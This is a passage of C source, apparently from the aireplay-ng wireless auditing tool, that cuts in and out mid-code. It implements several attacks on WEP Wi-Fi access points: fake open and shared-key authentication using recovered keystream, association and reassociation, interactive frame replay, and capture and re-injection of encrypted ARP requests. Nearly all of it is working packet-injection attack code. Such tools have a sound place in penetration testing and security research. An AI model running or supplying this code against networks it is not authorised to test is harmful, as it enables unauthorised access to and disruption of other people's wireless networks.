10, 0, 4 );\n\n    memcpy( ctsbuf, \"\\xC4\\x00\\x94\\x02\", 4 );\n    memcpy( ctsbuf +  4, opt.r_bssid, 6 );\n\n    tries = 0;\n    abort = 0;\n    state = 0;\n    x_send=opt.npackets;\n    if(opt.npackets == 0)\n        x_send=4;\n\n    if(opt.prga != NULL)\n        ska=1;\n\n    tt = time( NULL );\n    tr = time( NULL );\n\n    while( 1 )\n    {\n        switch( state )\n        {\n            case 0:\n\t\t\t\tif (opt.f_retry > 0) {\n\t\t\t\t\tif (retry == opt.f_retry) {\n\t\t\t\t\t\tabort = 1;\n\t\t\t\t\t\treturn 1;\n\t\t\t\t\t}\n\t\t\t\t\t++retry;\n\t\t\t\t}\n\n                if(ska && keystreamlen == 0)\n                {\n                    opt.fast = 1;  //don't ask for approval\n                    memcpy(opt.f_bssid, opt.r_bssid, 6);    //make the filter bssid the same, that is used for auth'ing\n                    if(opt.prga==NULL)\n                    {\n                        while(keystreamlen < 16)\n                        {\n                            capture_ask_packet(&caplen, 1);    //wait for data packet\n                            z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;\n                            if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */\n                                z+=2;\n\n                            memcpy(iv, h80211+z, 4); //copy IV+IDX\n                            i = known_clear(keystream, &keystreamlen, weight, h80211, caplen-z-4-4); //recover first bytes\n                            if(i>1)\n                            {\n                                keystreamlen=0;\n                            }\n                            for(i=0;i<keystreamlen;i++)\n                                keystream[i] ^= h80211[i+z+4];\n                        }\n                    }\n                    else\n                    {\n                        keystreamlen = opt.prgalen-4;\n                        memcpy(iv, opt.prga, 4);\n                        memcpy(keystream, opt.prga+4, keystreamlen);\n                    }\n                }\n\n                state = 1;\n                tt = time( NULL );\n\n                /* attempt to authenticate */\n\n                memcpy( h80211, AUTH_REQ, 30 );\n                memcpy( h80211 +  4, opt.r_bssid, 6 );\n                memcpy( h80211 + 10, opt.r_smac , 6 );\n                memcpy( h80211 + 16, opt.r_bssid, 6 );\n                if(ska)\n                    h80211[24]=0x01;\n\n                printf(\"\\n\");\n                PCT; printf( \"Sending Authentication Request\" );\n                if(!ska)\n                    printf(\" (Open System)\");\n                else\n                    printf(\" (Shared Key)\");\n                fflush( stdout );\n                gotack=0;\n\n                for( i = 0; i < x_send; i++ )\n                {\n                    if( send_packet( h80211, 30 ) < 0 )\n                        return( 1 );\n\n                    usleep(10);\n\n                    if( send_packet( ackbuf, 14 ) < 0 )\n                        return( 1 );\n                    usleep(10);\n\n                    if( send_packet( ackbuf, 14 ) < 0 )\n                        return( 1 );\n                }\n\n                break;\n\n            case 1:\n\n                /* waiting for an authentication response */\n\n                if( time( NULL ) - tt >= 2 )\n                {\n                    if(opt.npackets > 0)\n                    {\n                        tries++;\n\n                        if( tries > 15  )\n                        {\n                            abort = 1;\n                        }\n                    }\n                    else\n                    {\n                        if( x_send < 256 )\n                        {\n                            x_send *= 2;\n                        }\n                        else\n                        {\n                            abort = 1;\n                        }\n                    }\n\n                    if( abort )\n                    {\n                        printf(\n    \"\\nAttack was unsuccessful. Possible reasons:\\n\\n\"\n    \"    * Perhaps MAC address filtering is enabled.\\n\"\n    \"    * Check that the BSSID (-a option) is correct.\\n\"\n    \"    * Try to change the number of packets (-o option).\\n\"\n    \"    * The driver/card doesn't support injection.\\n\"\n    \"    * This attack sometimes fails against some APs.\\n\"\n    \"    * The card is not on the same channel as the AP.\\n\"\n    \"    * You're too far from the AP. Get closer, or lower\\n\"\n    \"      the transmit rate.\\n\\n\" );\n                        return( 1 );\n                    }\n\n                    state = 0;\n                    challengelen = 0;\n                    printf(\"\\n\");\n                }\n\n                break;\n\n            case 2:\n\n                state = 3;\n                tt = time( NULL );\n\n                /* attempt to authenticate using ska */\n\n                memcpy( h80211, AUTH_REQ, 30 );\n                memcpy( h80211 +  4, opt.r_bssid, 6 );\n                memcpy( h80211 + 10, opt.r_smac , 6 );\n                memcpy( h80211 + 16, opt.r_bssid, 6 );\n                h80211[1] |= 0x40; //set wep bit, as this frame is encrypted\n                memcpy(h80211+24, iv, 4);\n                memcpy(h80211+28, challenge, challengelen);\n                h80211[28] = 0x01; //its always ska in state==2\n                h80211[30] = 0x03; //auth sequence number 3\n                fflush(stdout);\n\n                if(keystreamlen < challengelen+4 && notice == 0)\n                {\n                    notice = 1;\n                    if(opt.prga != NULL)\n                    {\n                        PCT; printf( \"Specified xor file (-y) is too short, you need at least %d keystreambytes.\\n\", challengelen+4);\n                    }\n                    else\n                    {\n                        PCT; printf( \"You should specify a xor file (-y) with at least %d keystreambytes\\n\", challengelen+4);\n                    }\n                    PCT; printf( \"Trying fragmented shared key fake auth.\\n\");\n                }\n                PCT; printf( \"Sending encrypted challenge.\" );\n                fflush( stdout );\n                gotack=0;\n                gettimeofday(&tv2, NULL);\n\n                for( i = 0; i < x_send; i++ )\n                {\n                    if(keystreamlen < challengelen+4)\n                    {\n                        packets=(challengelen)/(keystreamlen-4);\n                        if( (challengelen)%(keystreamlen-4) != 0 )\n                            packets++;\n\n                        memcpy(h80211+24, challenge, challengelen);\n                        h80211[24]=0x01;\n                        h80211[26]=0x03;\n                        send_fragments(h80211, challengelen+24, iv, keystream, keystreamlen-4, 1);\n                    }\n                    else\n                    {\n                        add_icv(h80211, challengelen+28, 28);\n                        xor_keystream(h80211+28, keystream, challengelen+4);\n                        send_packet(h80211, 24+4+challengelen+4);\n                    }\n\n                    if( send_packet( ackbuf, 14 ) < 0 )\n                        return( 1 );\n                    usleep(10);\n\n                    if( send_packet( ackbuf, 14 ) < 0 )\n                        return( 1 );\n                }\n\n                break;\n\n            case 3:\n\n                /* waiting for an authentication response (using ska) */\n\n                if( time( NULL ) - tt >= 2 )\n                {\n                    if(opt.npackets > 0)\n                    {\n                        tries++;\n\n                        if( tries > 15  )\n                        {\n                            abort = 1;\n                        }\n                    }\n                    else\n                    {\n                        if( x_send < 256 )\n                        {\n                            x_send *= 2;\n                        }\n                        else\n                        {\n                            abort = 1;\n                        }\n                    }\n\n                    if( abort )\n                    {\n                        printf(\n    \"\\nAttack was unsuccessful. Possible reasons:\\n\\n\"\n    \"    * Perhaps MAC address filtering is enabled.\\n\"\n    \"    * Check that the BSSID (-a option) is correct.\\n\"\n    \"    * Try to change the number of packets (-o option).\\n\"\n    \"    * The driver/card doesn't support injection.\\n\"\n    \"    * This attack sometimes fails against some APs.\\n\"\n    \"    * The card is not on the same channel as the AP.\\n\"\n    \"    * You're too far from the AP. Get closer, or lower\\n\"\n    \"      the transmit rate.\\n\\n\" );\n                        return( 1 );\n                    }\n\n                    state = 0;\n                    challengelen=0;\n                    printf(\"\\n\");\n                }\n\n                break;\n\n            case 4:\n\n                tries = 0;\n                state = 5;\n                if(opt.npackets == -1) x_send *= 2;\n                tt = time( NULL );\n\n                /* attempt to associate */\n\n                memcpy( h80211, ASSOC_REQ, 28 );\n                memcpy( h80211 +  4, opt.r_bssid, 6 );\n                memcpy( h80211 + 10, opt.r_smac , 6 );\n                memcpy( h80211 + 16, opt.r_bssid, 6 );\n\n                n = strlen( opt.r_essid );\n                if( n > 32 ) n = 32;\n\n                h80211[28] = 0x00;\n                h80211[29] = n;\n\n                memcpy( h80211 + 30, opt.r_essid,  n );\n                memcpy( h80211 + 30 + n, RATES, 16 );\n                memcpy( h80211 + 24, capa, 2);\n\n                PCT; printf( \"Sending Association Request\" );\n                fflush( stdout );\n                gotack=0;\n\n                for( i = 0; i < x_send; i++ )\n                {\n                    if( send_packet( h80211, 46 + n ) < 0 )\n                        return( 1 );\n\n                    usleep(10);\n\n                    if( send_packet( ackbuf, 14 ) < 0 )\n                        return( 1 );\n                    usleep(10);\n\n                    if( send_packet( ackbuf, 14 ) < 0 )\n                        return( 1 );\n                }\n\n                break;\n\n            case 5:\n\n                /* waiting for an association response */\n\n                if( time( NULL ) - tt >= 5 )\n                {\n                    if( x_send < 256 && (opt.npackets == -1) )\n                        x_send *= 4;\n\n                    state = 0;\n                    challengelen = 0;\n                    printf(\"\\n\");\n                }\n\n                break;\n\n            case 6:\n\n                if( opt.a_delay == 0 && opt.reassoc == 0 )\n                {\n                    printf(\"\\n\");\n                    return( 0 );\n                }\n\n                if( opt.a_delay == 0 && opt.reassoc == 1 )\n                {\n                    if(opt.npackets == -1) x_send = 4;\n                    state = 7;\n                    challengelen = 0;\n                    break;\n                }\n\n                if( time( NULL ) - tt >= opt.a_delay )\n                {\n                    if(opt.npackets == -1) x_send = 4;\n                    if( opt.reassoc == 1 ) state = 7;\n                    else state = 0;\n                    challengelen = 0;\n                    break;\n                }\n\n                if( time( NULL ) - tr >= opt.delay )\n                {\n                    tr = time( NULL );\n                    printf(\"\\n\");\n                    PCT; printf( \"Sending keep-alive packet\" );\n                    fflush( stdout );\n                    gotack=0;\n\n                    memcpy( h80211, NULL_DATA, 24 );\n                    memcpy( h80211 +  4, opt.r_bssid, 6 );\n                    memcpy( h80211 + 10, opt.r_smac,  6 );\n                    memcpy( h80211 + 16, opt.r_bssid, 6 );\n\n                    if( opt.npackets > 0 ) kas = opt.npackets;\n                    else kas = 32;\n\n                    for( i = 0; i < kas; i++ )\n                        if( send_packet( h80211, 24 ) < 0 )\n                            return( 1 );\n                }\n\n                break;\n\n            case 7:\n\n                /* sending reassociation request */\n\n                tries = 0;\n                state = 8;\n                if(opt.npackets == -1) x_send *= 2;\n                tt = time( NULL );\n\n                /* attempt to reassociate */\n\n                memcpy( h80211, REASSOC_REQ, 34 );\n                memcpy( h80211 +  4, opt.r_bssid, 6 );\n                memcpy( h80211 + 10, opt.r_smac , 6 );\n                memcpy( h80211 + 16, opt.r_bssid, 6 );\n\n                n = strlen( opt.r_essid );\n                if( n > 32 ) n = 32;\n\n                h80211[34] = 0x00;\n                h80211[35] = n;\n\n                memcpy( h80211 + 36, opt.r_essid,  n );\n                memcpy( h80211 + 36 + n, RATES, 16 );\n                memcpy( h80211 + 30, capa, 2);\n\n                PCT; printf( \"Sending Reassociation Request\" );\n                fflush( stdout );\n                gotack=0;\n\n                for( i = 0; i < x_send; i++ )\n                {\n                    if( send_packet( h80211, 52 + n ) < 0 )\n                        return( 1 );\n\n                    usleep(10);\n\n                    if( send_packet( ackbuf, 14 ) < 0 )\n                        return( 1 );\n                    usleep(10);\n\n                    if( send_packet( ackbuf, 14 ) < 0 )\n                        return( 1 );\n                }\n\n                break;\n\n            case 8:\n\n                /* waiting for a reassociation response */\n\n                if( time( NULL ) - tt >= 5 )\n                {\n                    if( x_send < 256 && (opt.npackets == -1) )\n                        x_send *= 4;\n\n                    state = 7;\n                    challengelen = 0;\n                    printf(\"\\n\");\n                }\n\n                break;\n\n            default: break;\n        }\n\n        /* read one frame */\n\n        FD_ZERO( &rfds );\n        FD_SET( dev.fd_in, &rfds );\n\n        tv.tv_sec  = 1;\n        tv.tv_usec = 0;\n\n        if( select( dev.fd_in + 1, &rfds, NULL, NULL, &tv ) < 0 )\n        {\n            if( errno == EINTR ) continue;\n            perror( \"select failed\" );\n            return( 1 );\n        }\n\n        if( ! FD_ISSET( dev.fd_in, &rfds ) )\n            continue;\n\n        caplen = read_packet( h80211, sizeof( h80211 ), NULL );\n\n        if( caplen  < 0 ) return( 1 );\n        if( caplen == 0 ) continue;\n\n        if( caplen == 10 && h80211[0] == 0xD4)\n        {\n            if( memcmp(h80211+4, opt.r_smac, 6) == 0 )\n            {\n                gotack++;\n                if(gotack==1)\n                {\n                    printf(\" [ACK]\");\n                    fflush( stdout );\n                }\n            }\n        }\n\n        gettimeofday(&tv3, NULL);\n\n        //wait 100ms for acks\n        if ( (((tv3.tv_sec*1000000 - tv2.tv_sec*1000000) + (tv3.tv_usec - tv2.tv_usec)) > (100*1000)) &&\n              (gotack > 0) && (gotack < packets) && (state == 3) && (packets > 1) )\n        {\n            PCT; printf(\"Not enough acks, repeating...\\n\");\n            state=2;\n            continue;\n        }\n\n        if( caplen < 24 )\n            continue;\n\n        switch( h80211[1] & 3 )\n        {\n            case  0: mi_b = 16; mi_s = 10; mi_d =  4; break;\n            case  1: mi_b =  4; mi_s = 10; mi_d = 16; break;\n            case  2: mi_b = 10; mi_s = 16; mi_d =  4; break;\n            default: mi_b = 10; mi_d = 16; mi_s = 24; break;\n        }\n\n        /* check if the dest. MAC is ours and source == AP */\n\n        if( memcmp( h80211 + mi_d, opt.r_smac,  6 ) == 0 &&\n            memcmp( h80211 + mi_b, opt.r_bssid, 6 ) == 0 &&\n            memcmp( h80211 + mi_s, opt.r_bssid, 6 ) == 0 )\n        {\n            /* check if we got an deauthentication packet */\n\n            if( h80211[0] == 0xC0 ) //removed && state == 4\n            {\n                printf(\"\\n\");\n                PCT; printf( \"Got a deauthentication packet! (Waiting %d seconds)\\n\", deauth_wait );\n                if(opt.npackets == -1) x_send = 4;\n                state = 0;\n                challengelen = 0;\n                read_sleep( deauth_wait * 1000000 );\n                deauth_wait += 2;\n                continue;\n            }\n\n            /* check if we got an disassociation packet */\n\n            if( h80211[0] == 0xA0 && state == 6 )\n            {\n                printf(\"\\n\");\n                PCT; printf( \"Got a disassociation packet! (Waiting %d seconds)\\n\", deauth_wait );\n                if(opt.npackets == -1) x_send = 4;\n                state = 0;\n                challengelen = 0;\n                read_sleep( deauth_wait );\n                deauth_wait += 2;\n                continue;\n            }\n\n            /* check if we got an authentication response */\n\n            if( h80211[0] == 0xB0 && (state == 1 || state == 3) )\n            {\n                if(ska)\n                {\n                    if( (state==1 && h80211[26] != 0x02) || (state==3 && h80211[26] != 0x04) )\n                        continue;\n                }\n\n                printf(\"\\n\");\n                PCT;\n\n                state = 0;\n\n                if( caplen < 30 )\n                {\n                    printf( \"Error: packet length < 30 bytes\\n\" );\n                    read_sleep( 3*1000000 );\n                    challengelen = 0;\n                    continue;\n                }\n\n                if( (h80211[24] != 0 || h80211[25] != 0) && ska==0)\n                {\n                    ska=1;\n                    printf(\"Switching to shared key authentication\\n\");\n                    read_sleep(2*1000000);  //read sleep 2s\n                    challengelen = 0;\n                    continue;\n                }\n\n                n = h80211[28] + ( h80211[29] << 8 );\n\n                if( n != 0 )\n                {\n                    switch( n )\n                    {\n                    case  1:\n                        printf( \"AP rejects the source MAC address (%02X:%02X:%02X:%02X:%02X:%02X) ?\\n\",\n                                opt.r_smac[0], opt.r_smac[1], opt.r_smac[2],\n                                opt.r_smac[3], opt.r_smac[4], opt.r_smac[5] );\n                        break;\n\n                    case 10:\n                        printf( \"AP rejects our capabilities\\n\" );\n                        break;\n\n                    case 13:\n                    case 15:\n                        ska=1;\n                        if(h80211[26] == 0x02)\n                            printf(\"Switching to shared key authentication\\n\");\n                        if(h80211[26] == 0x04)\n                        {\n                            printf(\"Challenge failure\\n\");\n                            challengelen=0;\n                        }\n                        read_sleep(2*1000000);  //read sleep 2s\n                        challengelen = 0;\n                        continue;\n                    default:\n                        break;\n                    }\n\n                    printf( \"Authentication failed (code %d)\\n\", n );\n                    if(opt.npackets == -1) x_send = 4;\n                    read_sleep( 3*1000000 );\n                    challengelen = 0;\n                    continue;\n                }\n\n                if(ska && h80211[26]==0x02 && challengelen == 0)\n                {\n                    memcpy(challenge, h80211+24, caplen-24);\n                    challengelen=caplen-24;\n                }\n                if(ska)\n                {\n                    if(h80211[26]==0x02)\n                    {\n                        state = 2;      /* grab challenge */\n                        printf( \"Authentication 1/2 successful\\n\" );\n                    }\n                    if(h80211[26]==0x04)\n                    {\n                        state = 4;\n                        printf( \"Authentication 2/2 successful\\n\" );\n                    }\n                }\n                else\n                {\n                    printf( \"Authentication successful\\n\" );\n                    state = 4;      /* auth. done */\n                }\n            }\n\n            /* check if we got an association response */\n\n            if( h80211[0] == 0x10 && state == 5 )\n            {\n                printf(\"\\n\");\n                state = 0; PCT;\n\n                if( caplen < 30 )\n                {\n                    printf( \"Error: packet length < 30 bytes\\n\" );\n                    sleep( 3 );\n                    challengelen = 0;\n                    continue;\n                }\n\n                n = h80211[26] + ( h80211[27] << 8 );\n\n                if( n != 0 )\n                {\n                    switch( n )\n                    {\n                    case  1:\n                        printf( \"Denied (code  1), is WPA in use ?\\n\" );\n                        break;\n\n                    case 10:\n                        printf( \"Denied (code 10), open (no WEP) ?\\n\" );\n                        break;\n\n                    case 12:\n                        printf( \"Denied (code 12), wrong ESSID or WPA ?\\n\" );\n                        break;\n\n                    default:\n                        printf( \"Association denied (code %d)\\n\", n );\n                        break;\n                    }\n\n                    sleep( 3 );\n                    challengelen = 0;\n                    continue;\n                }\n\n                aid=( ( (h80211[29] << 8) || (h80211[28]) ) & 0x3FFF);\n                printf( \"Association successful :-) (AID: %d)\\n\", aid );\n                deauth_wait = 3;\n                fflush( stdout );\n\n                tt = time( NULL );\n                tr = time( NULL );\n\n                state = 6;      /* assoc. done */\n            }\n\n            /* check if we got an reassociation response */\n\n            if( h80211[0] == 0x30 && state == 8 )\n            {\n                printf(\"\\n\");\n                state = 7; PCT;\n\n                if( caplen < 30 )\n                {\n                    printf( \"Error: packet length < 30 bytes\\n\" );\n                    sleep( 3 );\n                    challengelen = 0;\n                    continue;\n                }\n\n                n = h80211[26] + ( h80211[27] << 8 );\n\n                if( n != 0 )\n                {\n                    switch( n )\n                    {\n                    case  1:\n                        printf( \"Denied (code  1), is WPA in use ?\\n\" );\n                        break;\n\n                    case 10:\n                        printf( \"Denied (code 10), open (no WEP) ?\\n\" );\n                        break;\n\n                    case 12:\n                        printf( \"Denied (code 12), wrong ESSID or WPA ?\\n\" );\n                        break;\n\n                    default:\n                        printf( \"Reassociation denied (code %d)\\n\", n );\n                        break;\n                    }\n\n                    sleep( 3 );\n                    challengelen = 0;\n                    continue;\n                }\n\n                aid=( ( (h80211[29] << 8) || (h80211[28]) ) & 0x3FFF);\n                printf( \"Reassociation successful :-) (AID: %d)\\n\", aid );\n                deauth_wait = 3;\n                fflush( stdout );\n\n                tt = time( NULL );\n                tr = time( NULL );\n\n                state = 6;      /* reassoc. done */\n            }\n        }\n    }\n\n    return( 0 );\n}\n\nint do_attack_interactive( void )\n{\n    int caplen, n, z;\n    int mi_b, mi_s, mi_d;\n    struct timeval tv;\n    struct timeval tv2;\n    float f, ticks[3];\n    unsigned char bssid[6];\n    unsigned char smac[6];\n    unsigned char dmac[6];\n\nread_packets:\n\n    if( capture_ask_packet( &caplen, 0 ) != 0 )\n        return( 1 );\n\n    z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;\n    if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */\n        z+=2;\n\n    /* rewrite the frame control & MAC addresses */\n\n    switch( h80211[1] & 3 )\n    {\n        case  0: mi_b = 16; mi_s = 10; mi_d =  4; break;\n        case  1: mi_b =  4; mi_s = 10; mi_d = 16; break;\n        case  2: mi_b = 10; mi_s = 16; mi_d =  4; break;\n        default: mi_b = 10; mi_d = 16; mi_s = 24; break;\n    }\n\n    if( memcmp( opt.r_bssid, NULL_MAC, 6 ) == 0 )\n        memcpy( bssid, h80211 + mi_b, 6 );\n    else\n        memcpy( bssid, opt.r_bssid, 6 );\n\n    if( memcmp( opt.r_smac , NULL_MAC, 6 ) == 0 )\n        memcpy( smac, h80211 + mi_s, 6 );\n    else\n        memcpy( smac, opt.r_smac, 6 );\n\n    if( memcmp( opt.r_dmac , NULL_MAC, 6 ) == 0 )\n        memcpy( dmac, h80211 + mi_d, 6 );\n    else\n        memcpy( dmac, opt.r_dmac, 6 );\n\n    if( opt.r_fctrl != -1 )\n    {\n        h80211[0] = opt.r_fctrl >>   8;\n        h80211[1] = opt.r_fctrl & 0xFF;\n\n        switch( h80211[1] & 3 )\n        {\n            case  0: mi_b = 16; mi_s = 10; mi_d =  4; break;\n            case  1: mi_b =  4; mi_s = 10; mi_d = 16; break;\n            case  2: mi_b = 10; mi_s = 16; mi_d =  4; break;\n            default: mi_b = 10; mi_d = 16; mi_s = 24; break;\n        }\n    }\n\n    memcpy( h80211 + mi_b, bssid, 6 );\n    memcpy( h80211 + mi_s, smac , 6 );\n    memcpy( h80211 + mi_d, dmac , 6 );\n\n    /* loop resending the packet */\n\n\t/* Check if airodump-ng is running. If not, print that message */\n    printf( \"You should also start airodump-ng to capture replies.\\n\\n\" );\n\n    signal( SIGINT, sighandler );\n    ctrl_c = 0;\n\n    memset( ticks, 0, sizeof( ticks ) );\n\n    nb_pkt_sent = 0;\n\n    while( 1 )\n    {\n        if( ctrl_c )\n            goto read_packets;\n\n        /* wait for the next timer interrupt, or sleep */\n\n        if( dev.fd_rtc >= 0 )\n        {\n            if( read( dev.fd_rtc, &n, sizeof( n ) ) < 0 )\n            {\n                perror( \"read(/dev/rtc) failed\" );\n                return( 1 );\n            }\n\n            ticks[0]++;\n            ticks[1]++;\n            ticks[2]++;\n        }\n        else\n        {\n            /* we can't trust usleep, since it depends on the HZ */\n\n            gettimeofday( &tv,  NULL );\n            usleep( 1000000/RTC_RESOLUTION );\n            gettimeofday( &tv2, NULL );\n\n            f = 1000000 * (float) ( tv2.tv_sec  - tv.tv_sec  )\n                        + (float) ( tv2.tv_usec - tv.tv_usec );\n\n            ticks[0] += f / ( 1000000/RTC_RESOLUTION );\n            ticks[1] += f / ( 1000000/RTC_RESOLUTION );\n            ticks[2] += f / ( 1000000/RTC_RESOLUTION );\n        }\n\n        /* update the status line */\n\n        if( ticks[1] > (RTC_RESOLUTION/10) )\n        {\n            ticks[1] = 0;\n            printf( \"\\rSent %ld packets...(%d pps)\\33[K\\r\", nb_pkt_sent, (int)((double)nb_pkt_sent/((double)ticks[0]/(double)RTC_RESOLUTION)));\n            fflush( stdout );\n        }\n\n        if( ( ticks[2] * opt.r_nbpps ) / RTC_RESOLUTION < 1 )\n            continue;\n\n        /* threshold reached */\n\n        ticks[2] = 0;\n\n        if( nb_pkt_sent == 0 )\n            ticks[0] = 0;\n\n        if( send_packet( h80211, caplen ) < 0 )\n            return( 1 );\n\n        if( ((double)ticks[0]/(double)RTC_RESOLUTION)*(double)opt.r_nbpps > (double)nb_pkt_sent  )\n        {\n            if( send_packet( h80211, caplen ) < 0 )\n                return( 1 );\n        }\n    }\n\n    return( 0 );\n}\n\nint do_attack_arp_resend( void )\n{\n    int nb_bad_pkt;\n    int arp_off1, arp_off2;\n    int i, n, caplen, nb_arp, z;\n    long nb_pkt_read, nb_arp_tot, nb_ack_pkt;\n\n    time_t tc;\n    float f, ticks[3];\n    struct timeval tv;\n    struct timeval tv2;\n    struct tm *lt;\n\n    FILE *f_cap_out;\n    struct pcap_file_header pfh_out;\n    struct pcap_pkthdr pkh;\n    struct ARP_req * arp;\n\n    /* capture only WEP data to broadcast address */\n\n    opt.f_type    = 2;\n    opt.f_subtype = 0;\n    opt.f_iswep   = 1;\n\n    memset( opt.f_dmac, 0xFF, 6 );\n\n    if( memcmp( opt.r_smac, NULL_MAC, 6 ) == 0 )\n    {\n        printf( \"Please specify a source MAC (-h).\\n\" );\n        return( 1 );\n    }\n\n    if(getnet(NULL, 1, 1) != 0)\n        return 1;\n\n    /* create and write the output pcap header */\n\n    gettimeofday( &tv, NULL );\n\n    pfh_out.magic         = TCPDUMP_MAGIC;\n    pfh_out.version_major = PCAP_VERSION_MAJOR;\n    pfh_out.version_minor = PCAP_VERSION_MINOR;\n    pfh_out.thiszone      = 0;\n    pfh_out.sigfigs       = 0;\n    pfh_out.snaplen       = 65535;\n    pfh_out.linktype      = LINKTYPE_IEEE802_11;\n\n    lt = localtime( (const time_t *) &tv.tv_sec );\n\n    memset( strbuf, 0, sizeof( strbuf ) );\n    snprintf( strbuf,  sizeof( strbuf ) - 1,\n              \"replay_arp-%02d%02d-%02d%02d%02d.cap\",\n              lt->tm_mon + 1, lt->tm_mday,\n              lt->tm_hour, lt->tm_min, lt->tm_sec );\n\n    printf( \"Saving ARP requests in %s\\n\", strbuf );\n\n    if( ( f_cap_out = fopen( strbuf, \"wb+\" ) ) == NULL )\n    {\n        perror( \"fopen failed\" );\n        return( 1 );\n    }\n\n    n = sizeof( struct pcap_file_header );\n\n    if( fwrite( &pfh_out, n, 1, f_cap_out ) != 1 )\n    {\n        perror( \"fwrite failed\\n\" );\n        return( 1 );\n    }\n\n    fflush( f_cap_out );\n\n    printf( \"You should also start airodump-ng to capture replies.\\n\" );\n\n    if(opt.port_in <= 0)\n    {\n        /* avoid blocking on reading the socket */\n        if( fcntl( dev.fd_in, F_SETFL, O_NONBLOCK ) < 0 )\n        {\n            perror( \"fcntl(O_NONBLOCK) failed\" );\n            return( 1 );\n        }\n    }\n\n    if ( opt.ringbuffer )\n        arp = (struct ARP_req*) malloc( opt.ringbuffer * sizeof( struct ARP_req ) );\n    else\n        arp = (struct ARP_req*) malloc( sizeof( struct ARP_req ) );\n\n    memset( ticks, 0, sizeof( ticks ) );\n\n    tc = time( NULL ) - 11;\n\n    nb_pkt_read = 0;\n    nb_bad_pkt  = 0;\n    nb_ack_pkt  = 0;\n    nb_arp      = 0;\n    nb_arp_tot  = 0;\n    arp_off1    = 0;\n    arp_off2    = 0;\n\n    while( 1 )\n    {\n        /* sleep until the next clock tick */\n\n        if( dev.fd_rtc >= 0 )\n        {\n            if( read( dev.fd_rtc, &n, sizeof( n ) ) < 0 )\n            {\n                perror( \"read(/dev/rtc) failed\" );\n                return( 1 );\n            }\n\n            ticks[0]++;\n            ticks[1]++;\n            ticks[2]++;\n        }\n        else\n        {\n            gettimeofday( &tv,  NULL );\n            usleep( 1000000/RTC_RESOLUTION );\n            gettimeofday( &tv2, NULL );\n\n            f = 1000000 * (float) ( tv2.tv_sec  - tv.tv_sec  )\n                        + (float) ( tv2.tv_usec - tv.tv_usec );\n\n            ticks[0] += f / ( 1000000/RTC_RESOLUTION );\n            ticks[1] += f / ( 1000000/RTC_RESOLUTION );\n            ticks[2] += f / ( 1000000/RTC_RESOLUTION );\n        }\n\n        if( ticks[1] > (RTC_RESOLUTION/10) )\n        {\n            ticks[1] = 0;\n            printf( \"\\rRead %ld packets (got %ld ARP requests and %ld ACKs), \"\n                    \"sent %ld packets...(%d pps)\\r\",\n                    nb_pkt_read, nb_arp_tot, nb_ack_pkt, nb_pkt_sent, (int)((double)nb_pkt_sent/((double)ticks[0]/(double)RTC_RESOLUTION)) );\n            fflush( stdout );\n        }\n\n        if( ( ticks[2] * opt.r_nbpps ) / RTC_RESOLUTION >= 1 )\n        {\n            /* threshold reach, send one frame */\n\n            ticks[2] = 0;\n\n            if( nb_arp > 0 )\n            {\n                if( nb_pkt_sent == 0 )\n                    ticks[0] = 0;\n\n                if( send_packet( arp[arp_off1].buf,\n                                 arp[arp_off1].len ) < 0 )\n                    return( 1 );\n\n                if( ((double)ticks[0]/(double)RTC_RESOLUTION)*(double)opt.r_nbpps > (double)nb_pkt_sent  )\n                {\n                    if( send_packet( arp[arp_off1].buf,\n                                    arp[arp_off1].len ) < 0 )\n                        return( 1 );\n                }\n\n                if( ++arp_off1 >= nb_arp )\n                    arp_off1 = 0;\n            }\n        }\n\n        /* read a frame, and check if it's an ARP request */\n\n        if( opt.s_file == NULL )\n        {\n            gettimeofday( &tv, NULL );\n\n            caplen = read_packet( h80211, sizeof( h80211 ), NULL );\n\n            if( caplen  < 0 ) return( 1 );\n            if( caplen == 0 ) continue;\n        }\n        else\n        {\n            n = sizeof( pkh );\n\n            if( fread( &pkh, n, 1, dev.f_cap_in ) != 1 )\n            {\n                opt.s_file = NULL;\n                continue;\n            }\n\n            if( dev.pfh_in.magic == TCPDUMP_CIGAM ) {\n                SWAP32( pkh.caplen );\n                SWAP32( pkh.len );\n            }\n\n            tv.tv_sec  = pkh.tv_sec;\n            tv.tv_usec = pkh.tv_usec;\n\n            n = caplen = pkh.caplen;\n\n            if( n <= 0 || n > (int) sizeof( h80211 ) || n > (int) sizeof( tmpbuf ) )\n            {\n                printf( \"\\r\\33[KInvalid packet length %d.\\n\", n );\n                opt.s_file = NULL;\n                continue;\n            }\n\n            if( fread( h80211, n, 1, dev.f_cap_in ) != 1 )\n            {\n                opt.s_file = NULL;\n                continue;\n            }\n\n            if( dev.pfh_in.linktype == LINKTYPE_PRISM_HEADER )\n            {\n                /* remove the prism header */\n\n                if( h80211[7] == 0x40 )\n                    n = 64;\n                else\n                    n = *(int *)( h80211 + 4 );\n\n                if( n < 8 || n >= (int) caplen )\n                    continue;\n\n                memcpy( tmpbuf, h80211, caplen );\n                caplen -= n;\n                memcpy( h80211, tmpbuf + n, caplen );\n            }\n\n            if( dev.pfh_in.linktype == LINKTYPE_RADIOTAP_HDR )\n            {\n                /* remove the radiotap header */\n\n                n = *(unsigned short *)( h80211 + 2 );\n\n                if( n <= 0 || n >= (int) caplen )\n                    continue;\n\n                memcpy( tmpbuf, h80211, caplen );\n                caplen -= n;\n                memcpy( h80211, tmpbuf + n, caplen );\n            }\n\n            if( dev.pfh_in.linktype == LINKTYPE_PPI_HDR )\n            {\n                /* remove the PPI header */\n\n                n = le16_to_cpu(*(unsigned short *)( h80211 + 2));\n\n                if( n <= 0 || n>= (int) caplen )\n                    continue;\n\n                /* for a while Kismet logged broken PPI headers */\n                if ( n == 24 && le16_to_cpu(*(unsigned short *)(h80211 + 8)) == 2 )\n                    n = 32;\n\n                if( n <= 0 || n>= (int) caplen )\n                    continue;\n\n                memcpy( tmpbuf, h80211, caplen );\n                caplen -= n;\n                memcpy( h80211, tmpbuf + n, caplen );\n            }\n        }\n\n        nb_pkt_read++;\n\n        /* check if it's a disassociation or deauthentication packet */\n\n        if( ( h80211[0] == 0xC0 || h80211[0] == 0xA0 ) &&\n            ! memcmp( h80211 + 4, opt.r_smac, 6 ) )\n        {\n            nb_bad_pkt++;\n\n            if( nb_bad_pkt > 64 && time( NULL ) - tc >= 10 )\n            {\n                printf( \"\\33[KNotice: got a deauth/disassoc packet. Is the \"\n                        \"source MAC associated ?\\n\" );\n\n                tc = 